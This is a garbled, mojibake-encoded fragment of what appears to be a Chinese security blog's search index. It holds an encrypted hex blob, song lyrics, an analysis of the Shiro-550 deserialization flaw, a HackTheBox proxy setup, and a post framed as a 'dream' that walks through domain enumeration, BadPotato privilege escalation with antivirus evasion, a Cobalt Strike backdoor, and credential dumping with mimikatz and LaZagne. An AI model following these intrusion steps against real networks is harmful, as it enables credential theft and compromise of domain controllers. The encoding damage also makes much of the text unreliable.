b6870d1213a5bb35f0cbeb9a435b26bc7162d11433eeb402ae7a29f928f63925fda434978f99e82d22c4f99597dcaffce6ab059b158ff10271326dbe3381b19da4c8783bab2d391a0fdae6c3510f9844f297c285084e50cb1313285e7ac93b0eb54b56b2017d2327c4d57f968d8e6beacbc3ea9c8ac649bc342d91789479d040f1c32491659f1b3bd224bf18c8b06b72a9fa5131b5cba35455b54d0eae8e34d2d6b55839c43e66dd76912e7883cd6130ad17b40ad489fb17eccc7d8cd83b7160365d6e9f3ce3dbed41d038c98c49a39c9c3bfb43b06cafe279f7fb7c77fe0acf618923bab7a9d2e0be7d66547d2ad3fc8fde2087824df597b8cfd7d65e9901e7bcb3774e49ede01c770d2bae0f0a25844f5cfa7c824dd2939fc17856a8750711efe48d8ba56f517aae34197c0b5d986cc6a599da307667f59e5a8643801b5c2080c5b8dff8c42dd7889f99f5efeb563f455b7091893e0f78284798c6cb8696212e113e330f8be14bfb9ae98af8beed637a762cbaed7ce383414a68e952dd33110af05c128de68a842c159ee10de42b5c3690314ede6d003c3a81ca63a8eee7e108de1a05e2d737b7eb505979a344428e587cbed2a760809e49849380230710736dd896cff733de304da01e15b3227bef9c6031e11283022a2352f0b1da923af4788d76a2bb0f98baa55efd3d418f1ac546cd3016f237145b0a3db1f8db074a36668210d2a47f9a958bcaf618e4c1249adf81ecf57b90d4d040ae56a1f8733afaa7bc3c4337e16d704c4e76cf3207e1bfbbcd2776608a9ee5fbb487e56eb480d1420bc7ae647db599e3028b0764971cb7d9b0f0e0fe038e8134828f2de1c3d4bbdf61df4c81c25a9a7e0d477d035002bcc29171fa7fa0224ad90db1f825f18551aee7d5926f883ecc2f8363e07e47316173b67c0252c4f2bafc0ebc251a5a5009ccc8920d0debc4b180adf681f96f5c0f73df7c8383b268c5c22b4adc6ea7a3694c41b333afdd82e11088ad5c5d26ed0a9895b56e9a562d975ddc68eb8007d2c78472f2e5d7c1883000c65c4dd977108d31a3806675ef3878d452edb839fbc433f52d92333e6e45a8e512a9ff28fe97d8ca6e262264b94f04a50d5ca8c94fb9df0dd072573426bb40b5621b2bdd9f188d5ca6672c0be916ee5b4a2a18320d3dd4239d2488b02f7d1418f22986ec89b47f0afc1880c01915ab751ad82393cdcfcafd7ad541bd5911aaef69ccd7761221b85bd61700d855f8db3568ddd4662602e9f0ae25bea443ca1075a080642389e84a02e0ec87b37571a941af13a71e69af472822b42747a17d10c809338640a72a62f8a1e815f23edac6df44d31638e6b1ab1dad09fb7ffcbe93d912d11f7d9dce7586071b9e2cdb440d4c1513a786135895949653e20f5fdf12129b4688c697a4f927c97d722190855366670fb51a81242a29e8a54856e0f73dc853da3391295a57152b765525c36fe0217d27e7cb10378c3c48d431daaea254fc9ee6f78cc6866d20d83bf6365ab737aec0e0933985cff9b98ae7900b96f93ce4d2fac570c81bdffb3a2cfd011742776ed9a7fb7bbf5402e40d32e2c2fc729463cffab5d078917e15d7de291073544e1fd942551c2c390f7a3d7020cd70f2ccd726788d1c7103b367c37b8a3c9677c7f73a947857260fc2767eb55a2fc317a865cede6cc5e2c46a20da35d9b318555cdac1168cc21799621d6275bcb9cde7f47b6bf01a992cd603881152cb485dfea59a4ac1aefd4c5e12bda7a742b43a9646509da94a72e5f5a9794620007dc8501829df5ea4318998f206f1f6c97036fa42fadcd3573815c4d0f0e396df954516170636101d7c504a411e144a42d7ab8e2e941ed328f45ac17c80288575bfa330a91428a461363dc047fbc97b52d7ce9d107e95617cbf6133a6b47e08e07e332dd178ae57cb5ed491a536a6a42bab23174b6c69d9b644293d50593a279e7507b688b7bc0a4263319fa6264f747fab298890cf2394e177e7dc07d918ece7f29d360cf02c4882819bf3d8065c75d287bd6cf1613640e6d7c8afa5336e876acca4a150570030142c81441b6ccdb647d000522867fc4bd85a621445cf38f2a1ef6293f6bfe20dcc982237ab7aff6a6c7f80b1867bc74a5a44643c2ca856fd27822fef99e2cc86ae2df53fe6ab8fbb5acf7a49e08165fdc0478b97b6befc529bb6bfff221f4eb1e781f0556bc2ae8465d6af6c0ac991e79b422063f7a39d3a19378d6de4851d7c2e632ec819bd720bfd020d3e35b80bf6cd1c43bd4396760b8ae034d0a7edb77b4559c0f90fb2b304eda08783cd38d781ba166c1001019c40cfc35bf739c6c849db10b7af0aebfc0905c3a66bbfc86f42fee304d2620300e81142bc5a7a5db603fdc595d0fae7f961425f5b54f2a673300b8e701b26d76a9cbbd63d9b6846350994297ef186d25a3c6a9f230102e67a32aafb1fa66e1f84f41919d2dc663a05013e098e65487290a33da121504f031a38e372ef621f4800870369d62925d5b2c2452c623c706c56c60a44d27ffccbf9c9b459ccdff8a87690bf7c1eaeee541738212a7082653e0c588b150257147e32d0708d9b009ceac0c7c2fba30b804f5e71dcd8458a0388d77e5d5dd788fa06c64b6e68f0e24fd24b2d66565dc5140839871faa1911ba653ff05bd59c5828fee622f93609bd9257e355db6e87465667deaea42a6ab7ecffefb10073a2f066ca29671a913c24d46db2c48198d36fec6c81e0f7e4e063fb069426166ef0e69effc2fd91f51d9664569d34d0ea0fa8d021b707878e9453b3e9e70ee5456bb4052b2ec74c70c88dd306cfde7e8f70dec91449c20529b941e71f7a731e900ab9116f70b0683bd595162f80754596bdf84871caf831a22be52022c1e2e38c65b981b34b45cffbc7b2ce68c54ec24db15afa794432cf9adea4848da93cd40a2b2a5dec6bd3c72627740991c69d82681d7a7612db82ccfe0ddaecc52762bebe1c35dc73590593bef6250a83a1e36123f83d965ed519c2861636ccdf52d541000712a5850b400f1b6de8c65c72cb2d1d1c430e7755f3166eae29c4a616eb2f45833a0accc63137c7e27b05353d08ba9437b33885517b95f829a84e87338f9e457caa8567b92096e1bc196112eef714021c2c596af09c58571b1a567b8bd59dafdfc79d8540a28ac2e5309168a319b6d6de98e943b3fbcfb91910d622f3ce964e46f422a51bd00b9d25c0d0753b6fd0b8daa11b4e82972caf0b7c44a6d724d390a15506f42a250f8e26d762316715c50cf1d31a058b8425812dfc68cd58b01bcfc6cd770e013fec3284be3066697f1f3fa0dda44c369fe6a356bd91ee937c098a801a72b5b17378256b58263ff0bdac455aceadd7ab73d92f5476308e82c57b59bfc95c27fdba423523521ffcb263ae4f0453d3ad9dee04a0c318777c1ac4981c6db8fa4c1ab98f0c840dfda5f41912990ead37e7b541d440fa762ca3190ad573ec3d5e2d40f6ee9767aba21716d989686a47b9b10bec748f89b213c5a17e072b391e51b38bec692471541e8eedf49e8d4dea7cbdb9a0e18b27f27d4526d7d6f47ef76ddc8f71ad4ca3952ed47c15381f302f84870dc6ef37eb80f73b8f3da42330e80dae7518b041a95c53d647ae60fc66bea2e0fb73d33b34cc2b33b92a401467d7ec58012df0b0676a3167bab4c6b2a39ab74e52ae8af64f9a410d76f1104fc637d35a0180fad235bcdcff6bc011020c06f10139d396b7c7a4bbdf469727bbd8622d19464bb7d23b0f297e3ee9a3ca27faf0b827af335986bcc6d7c4fb2fce184a0d94fdf680e7378fe9401ba5f81801040a8eaf87258f7e34b0151d2862c77d08309e9a94f87cd53e7027a336bf39d12e9cd06b1362ba4914d8b91c3360f6ac953bde3bf8e672e330286780a9d84c820411147bb78a2f53cfc7c0d508233413af5cb2e90ebaa6b6d4102a5707d3af181d8ba97d5338c711654b38a319a3d65357b9074c7d25fe6bc3375c8df27438d862bea012b2dc1367c471c1c4fd4b56907b3584a5386a41b0b3c8589508ada859e8bcb780a8e2290bdfc29093a5a7f67f51c26cb84ed5b313000263f595b32d2dc6057433301bd9f0303824e8d2a4a29de2232fe28c10aaadd10ff4eb6556a2e8c78a803c90ed233294b01cb153773589f5d1134fd543d101834cc203b4dfd895e212f90c34961ce86aa077e73b968cbadaf1e8e9023f2c7ab0eac9ad5da1ffaa4ae3b37d2398d912ff975caf8a455a3d2fa4f07a7632b91a957011ed9d6ca0c8f1edd33889c06 æ‚¨å¥½, è¿™é‡Œéœ€è¦å¯†ç .","link":"/2021/07/09/åŸºäºASP.NET_MVCçš„easycmsçš„easyä»£ç å®¡è®¡/"},{"title":"æƒŠå›æ™“æ¢¦å¿†ç§‹å¨Ÿ","text":"æƒŠå›æ™“æ¢¦ï¼Œé¹¤å”³å£°å£°ï¼Œåˆå£°å£°å¯’è§’å¹éæ±ŸåŸï¼Œéš”å²¸è’¹è‘­äººå¯‚é™ï¼ŒåºŸæ± ä¹”æœ¨ä¹ŸåŒè¨€å…µï¼Œæ˜¨å¤œé†‰ä¹¡éš¾é…©é…Šï¼Œä»Šæœæ­§è·¯æœªåˆ†æ˜ï¼Œæ¨Šå·è½é­„æ‚²åŒå‘½ï¼Œæƒ…åˆ°æ·±æ—¶ä¸€æ­»è½»ï¼Œé‡è¿˜æœ‰ çº¦ä½†ç³»æœŸæ— å®šï¼Œåˆæ€•èµ¢å¾—é’æ¥¼è–„å¹¸åï¼Œè¾—è½¬æ€é‡å¿ƒè‡ªçœï¼Œéƒ½ç³»æ–‡ç« è´Ÿæˆ‘æˆ‘è´Ÿå¿å¿ï¼Œä¼°è¯é’Ÿé¼å±±æ—è™½åˆ™çš†å¹»å½±ï¼Œæœ‰ä¸ªé£å°˜çŸ¥å·²ä¸è´Ÿæˆ‘ç”Ÿå¹³ï¼Œæ€æƒ³ä¸¤æœˆç»¸ç¼ªå¦‚ç”»é¥¼ï¼Œåªæ¢å¾—ä¸€èˆ¹ç¦»æ¨ç‹¬å¯¹æ•°å³°é’ï¼Œæ­£ç³»ç´ æ„¿ç©ºç•™æ˜ç ä¾è˜ï¼ŒæŸ”ä¸è‡ªç¼šæ…§å‰‘æ— çµï¼ŒéŸ¶åå¦‚æ¢¦ç»ˆé¡»è®¤ï¼Œäº‰æ•™çº¢æ³ªä¸æˆå†°ï¼Œä½ æ„¿åŒ–è¶ç›¸å¯»ä½†ç³»è°ä¸ºå¼•é¢†ï¼Œä½ éƒ½æœªçŸ¥ä½•å¤„æˆ‘åˆè¦ç™»ç¨‹ã€‚ å¾é€”æ˜¼æ°¸ï¼Œæˆ‘åˆå€šè“¬æµï¼Œä½ ç‡è’æ‘é»„å¶åˆè¿‘é‡é˜³ï¼Œè®°å¾—å»å¹´ä»Šæ—¥å°šä½œééæƒ³ï¼Œæƒ³è¯ç¥ä»™å””æ„¿æ„¿åšé¸³é¸¯ï¼Œæ°´æš–æ˜¥æ±ŸåŒè¡æ¼¾ï¼Œä¸ç®¡äººé—´ç¦»åˆä¸–æ€ç‚å‡‰ï¼Œåªè¦æ‚£éš¾ç›¸æ‰¶æ¬¢æ„‰å…±äº«ï¼Œç”Ÿæ—¶æˆå¯¹æ­»äº¦æˆåŒï¼Œæˆ‘è¯ç³»å‰ä¸–å§»ç¼˜ä½ è¯ç³»å†¤å­½è´¦ï¼Œåªæ€¨å¥´å¥´ç”Ÿé”™ä¸€å‰¯è½¯å¿ƒè‚ ï¼Œæ€•æˆ‘å¤ªè¿‡å¤šæƒ…ä¼šå®¹æ˜“åˆ«å‘ï¼Œé‡ç€æµ®èŠ±æµªè•Šåˆè¯æ€œé¦™ï¼Œæˆ‘æ„¿å¿æ‚”å¾€æ—¥ç–ç‹‚é‡æ±‚ä½  è§è°…ï¼Œä½ ç§çœŸæƒ…çœŸä¹‰ä»¤æˆ‘æ²¡é½¿ä¹Ÿéš¾å¿˜ï¼Œåªæœ›é’äº‘æœ‰è·¯äººæ— æ™ï¼Œæœ‰æ—¥è£å½’è¡£é”¦æŠ¥ç­”çº¢å¦†ï¼Œä¸ªé˜µç¿ ç»•ç å›´ä¸å¤å½“å¹´ä¸ªæ ·ï¼Œæå¤´é£ä¸Šç­‰ä½ æ°”ååæ‰¬ï¼Œä»Šæ—¥ç›¸å®ˆéƒ½å””æœªèƒ½é‡å­˜ä¹œé‡å¥¢æœ›ï¼Œæˆ‘äº¦å¯’ææ‹£å°½é¬“æŸ“ç§‹éœœï¼Œä½†æ„¿åèŠ±æœ‰ä¸»æ—©æ—¥é™¤é­”éšœï¼Œæ„¿ä½ æ—©æ—¥é™¤é­”éšœï¼Œæ›´æ„¿äº¤è¿˜æ©çˆ±å»ç¤¼ç©ºç‹ã€‚ é£˜é›¶å»ï¼Œä½ éƒ½è«é—®å‰å› ï¼Œåªè§åŠå±±æ®‹ç…§ä¸€ä¸ªæ„äººï¼Œå»è·¯èŒ«èŒ«ä¸ç¦æ‚²æ¥é˜µé˜µï¼Œå‰å°˜æƒ˜æƒ˜æƒ¹æˆ‘æ³ªè½çº·çº·ï¼Œä»æ˜¯å¿µå¿µä¸å¿˜å¿ƒç›¸å°ï¼Œå°šæœ‰å‡ å›è‚ æ–­å‡ åº¦é”€äº‘ï¼Œæœ¬æƒ³å­¦æŠ•ç¬”ä»æˆå›¾å‘å¥‹ï¼Œå´è¢«å„’å† è¯¯äº†æˆ‘æœ‰å¿—éš¾ä¼¸ï¼Œæƒ³å­¦ä¸€æ£¹äº”æ¹–åŒééšï¼Œå´è¢«å¦–çº·ç¬¼éè¿œæ— å ï¼Œæƒ³å­¦é£è›¾ç ´èŒ§ä¸å¤æƒ…ä¸å›°ï¼Œå´è¢«ä¸€ç¯çº¢ç„°åˆç„šèº«ï¼Œæ­£ç³»äº†å¾—ç›¸æ€éš¾äº†æ¨ï¼Œæ¢¦æ¥ä½•å¤„æ›´ä¸ºäº‘ï¼Œé‡è®²ä¹œçŸ³çƒ‚æµ·æ¯æƒ…ä¸æ³¯ï¼Œå°±ç®—é‡é€¢æœ‰æ—¥å·²æ˜¯è´Ÿä¹‰å¿˜æ©ï¼Œä»Šæ—¥å€šæ¥¼äººè¿œå¤©æ¶¯è¿‘ï¼Œå‘¢ä»¶é’è¡«æ›¾æŸ“æˆ‘åœ°è¯åˆ«å•¼ç—•ï¼Œè¥Ÿå‰æœ‰ä¸¤ç“£ç³»ä½ å”‡è„‚æ™•ï¼Œå‡ åº¦é›¨æ·‹æ—¥æ™’è€Œå®¶éƒ½è®¤å””çœŸï¼Œä½ ç‡æ²‰æ²‰æš®éœ­è¥¿é£ç´§ï¼Œå—é£åŒ—é›æ€•å‘å®¢ä¸­é—»ï¼Œå¹³å®‰æœªæŠ¥è‡ªé—®å¿ƒä½•å¿ï¼Œç©ºä½™æ³ªçœ¼æœ›æ–­é»„æ˜ï¼Œåˆå¬å¾—ç–é’Ÿå‡ æµå¥½ä¼¼æ¥ç›¸å¼•ï¼Œå¼•æˆ‘éƒ½è©ææ ‘ä¸‹è«æ‹çº¢å°˜ï¼Œè‰é™…ç§‹è™«å£°æ¸å“½ï¼Œåªè§éš”æ—ä¸€ç‚¹ä½›å‰ç¯ï¼Œä½›ç›¸åº„ä¸¥ç¯åˆæš—ï¼Œæ„§æˆ‘æ®‰æƒ…å‰²çˆ±ä¸¤æ— èƒ½ï¼Œè™½åˆ™æˆ‘ä½›æ…ˆæ‚²éƒ½ç³»éš¾æ•è–„å¹¸ï¼Œç”˜ä¸ºç¾æ—…äº†å´æ®‹ç”Ÿï¼Œä¸–é—´ä½•ç‰©å ªé…¬èµ ï¼Œå¿ƒè€¿è€¿ï¼Œä»æ­¤é£˜èå’Œæ–­æ¢—ï¼Œèƒ½è®¸æ·±æƒ…é»˜çº¦å¥å¥éƒ½æ— å‡­ã€‚","link":"/2022/04/25/æƒŠå›æ™“æ¢¦å¿†ç§‹å¨Ÿ/"},{"title":"æ²¡ä»€ä¹ˆå¥½åˆ†æçš„Shiro-550","text":"å‰è¨€é™†é™†ç»­ç»­åˆ†æäº†å‡ ä¸ªJavaçš„å®‰å…¨æ¼æ´ï¼Œæ¥ä¸‹æ¥è½®åˆ°shiroçš„äº†ã€‚è¿™é‡Œåˆ†æçš„æ˜¯Shiro-550ï¼Œç¡¬ç¼–ç rememberMeå¯†é’¥é€ æˆçš„ååºåˆ—åŒ–æ¼æ´ã€‚åˆ†æèµ·æ¥æ¯”æƒ³è±¡ç€çš„ç®€å•ã€‚ ç¯å¢ƒæ­å»ºShiro-550æ˜¯ä½¿ç”¨shiro1.2.4åŠä»¥ä¸‹çš„é»˜è®¤å¯†é’¥å¯¼è‡´çš„ååºåˆ—åŒ–æ¼æ´ï¼Œç¯å¢ƒçš„ä»£ç æˆ‘æ˜¯ç”¨çš„githubä¸Šä¸€ä¸ªå¤§ä½¬å†™çš„ï¼Œä½¿ç”¨çš„æ˜¯MavenåŒ…ç®¡ç†ï¼Œä¸ç”¨æ€ä¹ˆæ­ï¼Œè‡ªåŠ¨ä¸‹è½½ä¾èµ–ç›´æ¥è¿è¡Œå³å¯ã€‚ æ¼æ´è°ƒè¯•æ ¹æ®ç½‘ä¸Šå¤§éƒ¨åˆ†çš„å¤ç°æ–‡ç« ï¼Œä½¿ç”¨ysoserialç”ŸæˆCommonsBeanutils1ååºåˆ—åŒ–é“¾çš„payloadï¼Œå¹¶ä½¿ç”¨ä¸Šé¢shiroæ¼æ´ç¯å¢ƒé¡¹ç›®çš„GenPayloadç±»åŠ å¯†ä¸€ä¸‹payloadï¼Œç”Ÿæˆshiroå¯è¯†åˆ«çš„rememberMeå†…å®¹ã€‚ ç„¶åä¾æ—§æ˜¯åœ¨Runtimeçš„execæ–¹æ³•ä¸‹æ–­ç‚¹ï¼ŒCookieä¸­è®¾ç½®rememberMeå¹¶å‘é€ã€‚è°ƒç”¨æ ˆæŒºé•¿çš„ï¼Œä½†è·ŸrememberMeæœ‰å…³çš„æ˜¯ä»AbstractRememberMeManagerå¼€å§‹è¿™æ®µã€‚ è·Ÿè¿›åˆ°AbstractRememberMeManagerçš„getRememberedPrincipalsæ–¹æ³•ã€‚çœ‹åˆ°byteså˜é‡çš„å†…å®¹ä¸ºåŠ å¯†åçš„åºåˆ—åŒ–é“¾ï¼Œè·Ÿè¿›getRememberedSerializedIdentityæ–¹æ³•çœ‹çœ‹æ˜¯å¦‚ä½•è·å–rememberMeå†…å®¹çš„ã€‚ getRememberedSerializedIdentityæ–¹æ³•åœ¨AbstractRememberMeManagerç±»ä¸­æ˜¯æŠ½è±¡æ–¹æ³•ï¼Œå…·ä½“çš„å®ç°ä»£ç è¦å»åˆ°AbstractRememberMeManagerçš„å­ç±»CookieRememberMeManagerä¸­çœ‹ã€‚æ•´ä½“å°±æ˜¯ä»Cookieä¸­è·å–rememberMeå†…å®¹ï¼Œå¹¶è¿”å›base64è§£ç çš„å†…å®¹ã€‚rememberMeçš„å†…å®¹æ˜¯é€šè¿‡this.getCookie()è·å–å½“å‰çš„cookieå¯¹è±¡ï¼Œè€Œcookieåˆå§‹åŒ–æ—¶æ˜¯ç”¨rememberMeè¿™ä¸ªåç§°çš„ï¼Œè·å–åˆ°çš„å†…å®¹ç›¸åº”çš„ä¹Ÿè¯¥åç§°çš„å€¼ã€‚ 1234567891011121314151617181920212223242526protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) { if (!WebUtils.isHttp(subjectContext)) { ... return null; } else { WebSubjectContext wsc = (WebSubjectContext)subjectContext; if (this.isIdentityRemoved(wsc)) { return null; } else { HttpServletRequest request = WebUtils.getHttpRequest(wsc); HttpServletResponse response = WebUtils.getHttpResponse(wsc); String base64 = this.getCookie().readValue(request, response); if (\"deleteMe\".equals(base64)) { return null; } else if (base64 != null) { base64 = this.ensurePadding(base64); ... byte[] decoded = Base64.decode(base64); ... return decoded; } else { return null; } } }} è·å–åˆ°å­—èŠ‚æ•°ç»„ä¸ºéç©ºçš„è¯ä¼šç»§ç»­è°ƒç”¨convertBytesToPrincipalsæ–¹æ³•ï¼Œåœ¨convertBytesToPrincipalsæ–¹æ³•ä¸­å…ˆè°ƒç”¨decryptæ–¹æ³•å¯¹rememberMeè¿›è¡Œè§£å¯†ã€‚shiroä½¿ç”¨çš„æ˜¯AESåŠ å¯†ï¼ŒæŒ‰ç†è¯´è¿˜å…·æœ‰åˆå§‹åŒ–å‘é‡ivï¼Œä½†è§£å¯†æ—¶å€™çš„ivæ˜¯ä»rememberMeçš„å¼€å¤´è·å–çš„ï¼Œæ‰€ä»¥ä¸å½±å“payloadçš„æ„é€ ã€‚ 1234567891011121314151617181920public ByteSource decrypt(byte[] ciphertext, byte[] key) throws CryptoException { byte[] encrypted = ciphertext; byte[] iv = null; if (this.isGenerateInitializationVectors(false)) { try { int ivSize = this.getInitializationVectorSize(); int ivByteSize = ivSize / 8; iv = new byte[ivByteSize]; System.arraycopy(ciphertext, 0, iv, 0, ivByteSize); int encryptedSize = ciphertext.length - ivByteSize; encrypted = new byte[encryptedSize]; System.arraycopy(ciphertext, ivByteSize, encrypted, 0, encryptedSize); } catch (Exception var8) { String msg = \"Unable to correctly extract the Initialization Vector or ciphertext.\"; throw new CryptoException(msg, var8); } } return this.decrypt(encrypted, key, iv);} æ¥ç€æ˜¯å¯¹è§£å¯†åçš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€ç»ˆè°ƒç”¨æ–¹çš„æ˜¯DefaultSerializerç±»çš„deserializeæ–¹æ³•ã€‚è¿™é‡Œå®ä¾‹åŒ–ObjectInputStreamç±»æ˜¯ç”¨ä»–çš„å­ç±»ClassResolvingObjectInputStreamæ˜¯å®ç°çš„ã€‚ ClassResolvingObjectInputStreamçš„resolveClassæ–¹æ³•æ˜¯é€šè¿‡forNameæ–¹æ³•è¿”å›Classå®ä¾‹çš„ï¼Œä½†forNameä¸æ”¯æŒæ•°ç»„ç±»å‹çš„Classï¼Œæ‰€ä»¥ååºåˆ—åŒ–çš„åˆ©ç”¨é“¾æ²¡ä½¿ç”¨CommonsCollectionsçš„ï¼Œè€Œæ˜¯ç”¨äº†CommonsBeanutils1ã€‚å› ä¸ºäº‹å…ˆçœ‹äº†åˆ«çš„å¸ˆå‚…å¤ç°çš„æ–‡ç« ï¼Œæ‰€ä»¥æ²¡æœ‰è¸©è¿™ä¸ªå‘ã€‚å…·ä½“çš„forNameåŸç†åœ¨@zsxå¸ˆå‚…çš„æ–‡ç« é‡Œæœ‰è¯¦å°½çš„åˆ†æã€‚é™¤æ­¤ä¹‹å¤–ï¼Œåé¢çš„ååºåˆ—åŒ–å°±ä¸æ™®é€šçš„ååºåˆ—åŒ–æ— å¼‚ã€‚ åè®°CommonsBeanutils1é‡Œçš„TemplatesImplåœ¨ä¸Šå›Javaååºåˆ—åŒ–çš„æ–‡ç« é‡Œæ²¡æœ‰å­¦åˆ°ï¼Œå¥½åƒfastjsonä¸å‡ºç½‘çš„payloadæ˜¯æœ‰ç”¨åˆ°è¿™ä¸ªçš„ï¼Œåç»­è¿˜è¿˜è¦è¡¥å……å­¦ä¹ ã€‚å†²å†²å†² å‚è€ƒhttps://www.cnblogs.com/loong-hon/p/10619616.html https://p2hm1n.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/ https://www.mi1k7ea.com/2020/10/03/%E6%B5%85%E6%9E%90Shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88Shiro550%EF%BC%89/#%E9%83%A8%E5%88%86Gadget%E6%89%93%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%9D%91 http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/#4-%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F https://blog.zsxsoft.com/post/35","link":"/2021/09/14/æ²¡ä»€ä¹ˆå¥½åˆ†æçš„Shiro-550/"},{"title":"ç”¨ä¸å¯æè¿°çš„è½¯ä»¶åšHTBçš„å‰ç½®ä»£ç†","text":"å‰è¨€â€‹å‰æ®µæ—¶é—´æ‰“HTBï¼Œä¸€ç›´å—åˆ°é€Ÿåº¦æ…¢çš„å›°æ‰°ï¼Œæœ‰æ—¶ç­‰å¾…ä¸€äº›é™æ€èµ„æºåŠ è½½éƒ½è¦å¥½ä¹…ã€‚ç”±äºä¸€äº›ä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œè€Œä¸”HTBæä¾›çš„ä»£ç†æ˜¯OpenVpnï¼Œæ›´æ˜¯è¢«é‡ç‚¹å…³æ³¨ï¼Œäºæ˜¯æ‘¸ç´¢å‡ºæ¥ç»™HTBçš„OpenVpnåŠ ä¸ªå‰ç½®ä»£ç†çš„æ–¹æ³•ï¼Œå¯ä»¥åŠ å¿«ç‚¹é€Ÿåº¦ã€‚ å‡†å¤‡å·¥ä½œ ä¸å¯æè¿°è½¯ä»¶é…¸é…¸ä¹³å’Œè´¦å·ä¸€ä¸ªï¼ˆæˆ‘ç”¨çš„é…¸é…¸ä¹³ï¼Œç”¨V2ä»€ä¹ˆçš„åº”è¯¥ä¹Ÿæ˜¯å¯ä»¥çš„å§ï¼‰ å³é”®é…¸é…¸ä¹³çš„è¿è¡Œå›¾æ ‡ï¼Œç‚¹å‡»ç«¯å£è®¾ç½®ã€‚åƒä¸‹å›¾ä¸€æ ·ï¼Œæ·»åŠ ä¸€ä¸ªç«¯å£è®¾ç½®ã€‚å¼€å…³æ‰“å¼€ã€ç±»å‹é€‰ç«¯å£è½¬å‘ï¼Œç›®æ ‡åœ°å€ç”¨çš„HTBèŠ‚ç‚¹çš„åŸŸåï¼ŒæŒ‰å®é™…æƒ…å†µå¡«ï¼Œæœ¬åœ°ç«¯å£éšæ„ã€‚ ä¿®æ”¹é…ç½®æ–‡ä»¶æŒ‰ç…§å®˜ç½‘ä¸Šçš„æŒ‡å¼•ä¿®æ”¹åè®®ä¸ºtcpï¼ˆé…¸é…¸ä¹³é»˜è®¤åªæ”¯æŒtcpï¼‰ã€‚ ä¿®æ”¹udpåè®®ä¸ºtcpã€ä¿®æ”¹remoteçš„ç«¯å£ä¸ºç«¯å£è½¬å‘çš„æœ¬åœ°ç›‘å¬ç«¯å£ã€æœåŠ¡å™¨åœ°å€æ”¹ä¸ºç«¯å£è½¬å‘ç›‘å¬çš„ç½‘å¡ipåœ°å€ã€ä¿®æ”¹&lt;tls-auth&gt;æ ‡ç­¾ä¸º&lt;tls-crypt&gt;ã€‚ ä¿®æ”¹å¥½å¹¶ä¿å­˜ï¼Œå¯åŠ¨openvpnåº”è¯¥å°±èƒ½æ­£å¸¸è¿è¡Œäº†ï¼Œè™½ç„¶è¿˜æ˜¯å¾ˆæ…¢ï¼Œä½†é™æ€æ–‡ä»¶è‡³å°‘è¿˜èƒ½åŠ è½½ï¼Œè¿˜æ˜¯å……é’±æ‰èƒ½å˜å¾—æ›´å¼ºå•Šã€‚","link":"/2020/10/05/ç”¨ä¸å¯æè¿°çš„è½¯ä»¶åšHTBçš„å‰ç½®ä»£ç†/"},{"title":"ç¬¬äºŒæ¬¡æ¢¦é‡Œçš„åæ¸—é€","text":"å‰è¨€ç»§ä¸Šæ¬¡åšäº†ä¸€ä¸ªåæ¸—é€çš„æ¢¦ä¹‹åï¼Œæœ€è¿‘åˆåšäº†ä¸€ä¸ªåŒæ ·æ˜¯åæ¸—é€çš„æ¢¦ï¼Œåé¢å°±æ˜¯éƒ½æ˜¯ä¸€äº›åŸºç¡€æ“ä½œã€æ²¡ä»€ä¹ˆå¹²è´§çš„æ°´æ–‡ï¼Œåœ¨æ¢¦é‡Œè¿˜æ˜¯è¿™ä¹ˆèœã€‚ã€‚ã€‚å‘œ~å‘œ~å‘œ~ ä¿¡æ¯æ”¶é›†å…ˆæ”¶é›†åŸŸå†…ä¿¡æ¯ï¼Œå­˜åœ¨åŸŸï¼ŒåŸŸæ§å’ŒåŸŸç®¡ç†å‘˜å„ä¸¤ä¸ªã€‚ 123net time /domainnet group \"domain controllers\" /domainnet group \"domain admins\" /domain åœ¨æ”¶é›†ä¸‹ç½‘ç»œã€è¡¥ä¸å’Œæƒé™çš„ä¿¡æ¯ã€‚ 123ipconfig /allsysteminfowhoami /priv åˆšå¥½å…¶ä¸­ä¸€å°åŸŸæ§ä¸»æœºå°±æ˜¯å½“å‰è¿™å°æœºå­ï¼Œè¡¥ä¸æ‰“å¾—æ¯”è¾ƒå‹¤ï¼Œåˆæ˜¯å¼€å¯äº†SeImpersonateProvilegeï¼ŒPotatoç³»åˆ—ææƒå³å¯ã€‚ æå–æŸ¥çœ‹è¿›ç¨‹å‘ç°äº†WinDefendï¼Œæ‰¾äº†ä¸ªå…æ€çš„BadPotatoæ‰æäº†æƒã€‚ 1tasklist /svc | findstr WinDefend ç”¨BadPotatoè¿è¡Œäº†CSçš„å…æ€åé—¨ä¸Šäº†çº¿ï¼Œé¡ºä¾¿æ´¾ç”Ÿåˆ°äº†msfé‡Œã€‚mimikatzè¯»äº†ä¸€æ³¢å¯†ç ï¼Œç”±äºç³»ç»Ÿæ˜¯Windows2012ï¼Œæ‰€ä»¥æ²¡æœ‰è¯»åˆ°æ˜æ–‡å¯†ç ã€‚ æ¥ç€åˆç”¨Lazagne.exeè¯»äº†ä¸€æ³¢å¯†ç ï¼Œä½†æ˜¯é™¤äº†NTLMä¹‹å¤–å¹¶æ²¡æœ‰è¯»åˆ°å…¶ä»–çš„å¯†ç ã€‚ æ¨ªå‘ç§»åŠ¨è™½ç„¶åšäº†é™æ€å…æ€ï¼Œä½†æ˜¯å¾®è½¯çš„åŠ¨æ€æŸ¥æ€æŒºå¼ºçš„ï¼Œå¯¹å¤–æ‰«æä¸ä¸€ä¼šå°±ç»™WinDefendæ€äº†ï¼Œç»™æ¨ªå‘ç§»åŠ¨é€ æˆäº†ä¸å°‘å›°æ‰°ã€‚ä½†ä¸ä¼šæ‹¦æˆªæ·»åŠ ç”¨æˆ·å’Œæ·»åŠ 